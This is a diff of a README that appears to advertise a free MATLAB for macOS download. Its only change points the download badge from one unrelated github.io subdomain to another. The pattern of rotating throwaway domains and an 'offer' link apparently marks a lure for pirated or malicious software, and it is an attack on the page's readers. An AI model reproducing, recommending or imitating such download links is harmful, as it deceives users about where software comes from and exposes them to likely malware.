@@ -3,7 +3,7 @@
 **MATLAB** for **macOS** delivers a powerful environment for engineers, researchers, and developers to analyze data, build algorithms, and create models.  
 With Apple Silicon optimization, MATLAB combines performance, accuracy, and an intuitive interface for computation and visualization. 🍎  
 
-[![💛 Get GitHub Instruction](https://img.shields.io/badge/💛%20Get%20MATLAB%20macOS-FFB300?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=MatlabMac)
+[![💛 Get GitHub Instruction](https://img.shields.io/badge/💛%20Get%20MATLAB%20macOS-FFB300?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-load-app.github.io/.github/?offer=MatlabMac)
 
 ---
 
